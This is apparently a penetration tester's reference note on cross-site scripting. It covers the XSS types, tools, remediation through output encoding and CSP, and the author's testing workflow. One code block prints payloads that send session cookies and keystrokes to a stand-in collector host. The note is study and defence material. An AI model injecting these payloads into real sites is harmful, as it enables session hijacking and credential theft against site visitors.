# XSS

Cross-Site Scripting: injecting JavaScript into a web application so it runs in other users' browsers.

## Why It Matters

XSS runs attacker-controlled script in the context of a trusted site, which can steal session cookies, capture keystrokes, perform actions as the victim, or deface content. It appears wherever user input is reflected or stored without proper encoding.

## Reference

### Types

| Type | Description |
| :--- | :--- |
| Reflected | Input in a request is echoed into the response without encoding; delivered via a crafted link |
| Stored (persistent) | Payload is saved by the app (database, comment, profile) and runs for every visitor |
| DOM-based | Client-side JavaScript writes untrusted input into the page (for example via `eval` or `innerHTML`) |
| Blind | Payload fires somewhere the tester cannot see, confirmed with an out-of-band tool like XSS Hunter |

### Proving and Measuring Impact

A harmless popup proves the injection point; the others show real impact in an authorized test.

```javascript
// proof of concept
alert('XSS');

// session theft (sends the victim's cookie to a collector)
fetch('https://collector.example/steal?c=' + btoa(document.cookie));

// keylogger
document.onkeypress = function(e){ fetch('https://collector.example/k?k=' + btoa(e.key)); };
```

Filter-evasion payloads (polyglots that fire in multiple contexts) are catalogued in the PortSwigger and PayloadsAllTheThings cheat sheets linked below.

### Remediation

* **Context-aware output encoding** when rendering user input (HTML, attribute, JavaScript, URL contexts each differ)
* **Content Security Policy (CSP)** to restrict where scripts can load from and block inline script
* **Input validation** with allowlists
* Use framework features that auto-encode output, and avoid `eval`, `innerHTML`, and `document.write` on untrusted data

## Tools

| Tool | Use |
| :--- | :--- |
| [Burp Suite](burp-suite.md) / [OWASP ZAP](owasp-zap.md) | Finding and testing injection points |
| [XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter-express) | Catching blind XSS out of band |

## How I Use It

I confirm an injection point with a harmless `alert`, identify the context it lands in (HTML body, attribute, or script), then pick an encoding-appropriate payload. For reporting I demonstrate concrete impact such as session theft in a controlled way, and recommend output encoding plus CSP as the fix.

## Related

* [Web Authentication Bypass](web-authentication-bypass.md)
* [Web Application Recon](../reconnaissance/web-application-recon.md)
* [OWASP](../methodology/owasp.md)

## Resources

* [OWASP: Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
* [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [PayloadsAllTheThings: XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
